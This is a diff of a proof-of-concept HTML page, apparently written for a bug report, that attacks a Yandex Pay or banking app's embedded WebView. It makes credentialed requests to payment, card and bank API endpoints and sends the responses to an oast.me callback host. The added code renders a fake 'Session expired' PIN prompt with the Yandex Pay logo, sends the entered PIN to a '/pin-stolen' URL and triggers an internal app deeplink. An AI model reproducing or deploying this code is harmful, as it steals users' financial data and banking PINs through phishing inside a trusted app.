@@ -1,32 +1,55 @@
- <html><head><title>PoC</title></head>
+<html><head><title>PoC</title></head>
   <body>
   <script>
-  // The cookies are HttpOnly so we can't read them directly
-  // BUT we can make authenticated requests FROM this WebView
-  // because the cookie jar includes them automatically
+  // fetch to our server works, but Yandex APIs don't
+  // This means there's likely a navigation-based approach
 
-  var endpoints = [
-    "https://pay.yandex.ru/api/v1/user/info",
-    "https://pay.yandex.ru/api/v1/cards",
-    "https://pay.yandex.ru/api/v1/wallet/balance",
-    "https://bank-api.yandex.ru/api/v1/user/profile",
-    "https://bank-api.yandex.ru/api/v1/accounts",
-    "https://api.bank.yandex.net/v1/user/info",
-    "https://authproxy.prod.yb.yandex.net/api/v1/user",
+  // 1. Try XMLHttpRequest instead of fetch (different CORS handling in WebView)
+  var apis = [
     "https://plus-home.yandex.ru/v1/sdk/configuration",
-    "https://plus.yandex.ru/api/v1/user",
+    "https://pay.yandex.ru/api/v1/user/info",
   ];
 
-  var results = {};
-
-  Promise.all(endpoints.map(function(url) {
-    return fetch(url, {credentials: "include"})
-      .then(function(r) { return r.text().then(function(t) { results[url] = {status: r.status, body: t.substring(0,500)}; }); })
-      .catch(function(e) { results[url] = {error: e.message}; });
-  })).then(function() {
-    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/api-results?" + encodeURIComponent(JSON.stringify(results)));
-    document.title = "APIs: " + Object.keys(results).filter(function(k){ return results[k].status === 200; }).length + " success";
+  apis.forEach(function(url) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url, true);
+    xhr.withCredentials = true;
+    xhr.onload = function() {
+      fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/xhr-ok?" + encodeURIComponent(url + "|" + xhr.status + "|" + xhr.responseText.substring(0,500)));
+    };
+    xhr.onerror = function() {
+      fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/xhr-err?" + encodeURIComponent(url + "|" + xhr.status));
+    };
+    xhr.send();
   });
+
+  // 2. Try navigation-based exfil (top.location to steal URL with token)
+  // Some apps pass tokens in URL fragments after auth
+
+  // 3. The REAL impact: phishing inside the trusted app
+  // Render a fake "session expired" login form that steals credentials
+  document.body.innerHTML = '<div style="font-family:-apple-system;padding:20px;text-align:center;">' +
+    '<img src="https://avatars.mds.yandex.net/get-bank/65535/yandex-pay-logo.png" style="width:120px;margin:40px auto;">' +
+    '<h2 style="color:#fff;">Session expired</h2>' +
+    '<p style="color:#aaa;">Please re-enter your PIN to continue</p>' +
+    '<input type="password" id="pin" maxlength="4" placeholder="PIN" style="font-size:32px;text-align:center;width:200px;padding:15px;border-radius:12px;border:1px solid 
+  #333;background:#222;color:#fff;margin:20px auto;display:block;">' +
+    '<button onclick="steal()" style="background:#FFCC00;color:#000;border:none;padding:15px 60px;border-radius:12px;font-size:18px;font-weight:bold;">Confirm</button>' +
+    '</div>';
+  document.body.style.background = '#111';
+
+  window.steal = function() {
+    var pin = document.getElementById('pin').value;
+    fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/pin-stolen?" + pin);
+    document.body.innerHTML = '<div style="text-align:center;padding:60px;color:#fff;font-family:-apple-system;"><h2>✓</h2><p>Loading...</p></div>';
+  };
+
+  // 4. Also try to use the deeplink param to navigate internally
+  // The 'deeplink' param in URL shows: ybapp://plus-home-sdk/smart-webview?url=...
+  // Try navigating to internal screens
+  setTimeout(function(){
+    window.location.href = "ybapp://screen.open/cards";
+  }, 20000);
   </script>
   </body>
   </html>
